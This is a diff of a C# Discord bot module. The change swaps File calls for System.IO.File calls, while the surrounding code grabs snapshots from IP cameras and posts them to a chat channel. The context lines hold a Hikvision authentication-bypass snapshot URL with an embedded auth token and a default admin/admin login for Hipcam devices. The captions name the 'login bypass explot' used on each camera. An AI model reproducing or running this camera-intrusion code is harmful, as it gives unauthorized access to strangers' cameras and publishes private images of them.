@@ -22,7 +22,7 @@ namespace dicpicbotc.Modules
             DirectoryInfo d = new DirectoryInfo(dppath);
             foreach(FileInfo f in d.GetFiles())
             {
-                File.Delete(f.FullName);
+                System.IO.File.Delete(f.FullName);
             }
 
             Console.WriteLine("[info] cleaned up images folder.");
@@ -50,7 +50,7 @@ namespace dicpicbotc.Modules
                     string ip2r = ip2 + "/onvif-http/snapshot?auth=YWRtaW46MTEK";
                     w.DownloadFile(ip2r, dppath + "/" + rand + ".jpg");
 
-                    byte[] temp = File.ReadAllBytes(dppath + "/" + rand + ".jpg");
+                    byte[] temp = System.IO.File.ReadAllBytes(dppath + "/" + rand + ".jpg");
                     if (temp.Length < 1000)
                     {
                         throw new Exception("File too small");
@@ -59,7 +59,7 @@ namespace dicpicbotc.Modules
                     await Context.Channel.SendFileAsync(dppath + "/" + rand + ".jpg", ip2 + " using the hikvision login bypass explot");
                     try
                     {
-                        File.Delete(dppath + "/" + rand + ".jpg");
+                        System.IO.File.Delete(dppath + "/" + rand + ".jpg");
                         Console.WriteLine("[info] file deleted after posting.");
                     }
                     catch
@@ -88,7 +88,7 @@ namespace dicpicbotc.Modules
                     w.Credentials = new NetworkCredential("admin", "admin");
                     w.DownloadFile(ip2r, dppath + "/" + rand + ".jpg");
 
-                    byte[] temp = File.ReadAllBytes(dppath + "/" + rand + ".jpg");
+                    byte[] temp = System.IO.File.ReadAllBytes(dppath + "/" + rand + ".jpg");
                     if (temp.Length < 1000)
                     {
                         throw new Exception("File too small");
@@ -97,7 +97,7 @@ namespace dicpicbotc.Modules
                     await Context.Channel.SendFileAsync(dppath + "/" + rand + ".jpg", ip2 + " using hipcams default directory and password");
                     try
                     {
-                        File.Delete(dppath + "/" + rand + ".jpg");
+                        System.IO.File.Delete(dppath + "/" + rand + ".jpg");
                         Console.WriteLine("[info] file deleted after posting.");
                     }
                     catch
